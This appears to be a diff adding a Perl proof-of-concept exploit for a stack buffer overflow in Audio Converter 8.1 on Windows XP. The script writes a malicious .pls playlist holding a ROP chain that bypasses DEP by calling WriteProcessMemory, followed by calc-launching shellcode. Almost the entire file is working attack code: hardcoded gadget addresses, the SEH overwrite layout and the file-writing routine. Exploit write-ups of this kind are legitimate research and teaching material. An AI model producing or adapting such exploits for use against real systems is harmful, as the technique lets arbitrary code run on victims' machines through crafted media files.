@@ -1,0 +1,98 @@
+#***********************************************************************************
+# Exploit Title : Audio Converter 8.1 0day Stack Buffer Overflow PoC exploit ROP/WPM
+# Date          : 07/06/2010
+# Author        : Sud0
+# Bug found by  : chap0
+# Software Link : http://download.cnet.com/Audio-Converter/3000-2140_4-10045287.html
+# Version       : 8.1
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox)
+# Type of vuln  : SEH
+# Thanks to my wife for her support
+# Thanks for chap0 for bringing us the game
+# Greetz to: Corelan Security Team
+# mr_me you'r killing the ROP bro :)
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Using ROP to bypass DEP protection and call WPM
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# Corelan does not want anyone to use this script
+# for malicious and/or illegal purposes
+# Corelan cannot be held responsible for any illegal use.
+#
+# Note : you are not allowed to edit/modify this code. 
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#***********************************************************************************
+#code :
+print "|------------------------------------------------------------------|\n";
+print "|                         __               __                      |\n";
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
+print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
+print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
+print "|                                                                  |\n";
+print "|                                       http://www.corelan.be:8800 |\n";
+print "|                                                                  |\n";
+print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
+print "[+] Exploit for .... \n";
+
+my $filename="newaudio.pls";
+# Small Shellcode to run calc
+my $shellcode = "\x8B\xEC\x55\x8B\xEC\x68\x20\x20\x20\x2F\x68\x63\x61\x6C\x63\x8D\x45\xF8\x50\xB8\xC7\x93\xC2\x77\xFF\xD0";
+
+my 	$buffer  = "A" x 280; 			# some junk
+	$buffer .= "\x31\x2A\x00\x10"; 		# mov eax,ebp / pop ebp / retn4
+	$buffer .=  "B" x 12;  			# some junk
+	$buffer .= "\x1D\xA4\x07\x10";  	# add eax,100 / pop ebp / retn
+	$buffer .= "B" x 8;			# some junk
+	$buffer .= "\x1D\xA4\x07\x10";  	# NEXT : add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	$buffer .= "\x1D\xA4\x07\x10"; 		# NEXT :  add eax,100 / pop ebp / retn
+	$buffer .= "B" x 4 ; 			# some junk
+	
+	$buffer .= "\x00\x8D\x00\x10"; 		# POP EDI / RETN
+	$buffer .= "\xB6\x12\x00\x10"; 		# ADD ESP,4 / RETN
+	$buffer .= "\x05\x21\x00\x10"; 		# ADD ESP,14 / RETN
+	$buffer .= "B" x 20 ; 			# some junk
+	
+	$buffer .= "\x79\x84\x02\x10"; 		# mov dword ptr ss:[esp + 10], eax / call EDI
+	$buffer .= "\x13\x22\x80\x7C"; 		# @ of WPM
+	$buffer .= "\xFF\xFF\xFF\xFF"; 		# RET after WPM choose one and use it
+	$buffer .= "\xFF\xFF\xFF\xFF"; 		# -1 : means process itself
+	$buffer .= "\xCF\x22\x80\x7C"; 		# Destination address
+	$buffer .= "B" x 4 ; 			# some junk, @ of shellcode will land here
+	$buffer .= "\x1A\x00\x00\x00"; 		# size of shellcode 
+	$buffer .= "\x00\xA0\x45\x00"; 		# Writeable memory 
+	$buffer .= "B" x 12;			# some junk
+	$buffer .= $shellcode;
+
+	$buffer .= "B" x (4436 -length($buffer));  		# some junk
+	$buffer .= "\x2F\x37\x01\x10"; 		# SEH : add esp, 878 / retn 8
+	$buffer .= "A" x 10000;			# some junk
+
+print "Removing old $filename file\n";
+system("del $filename");
+print "Creating new $filename file\n";
+open(FILE, ">$filename");
+
+print FILE $buffer;
+close(FILE);
+
+
+
+
+
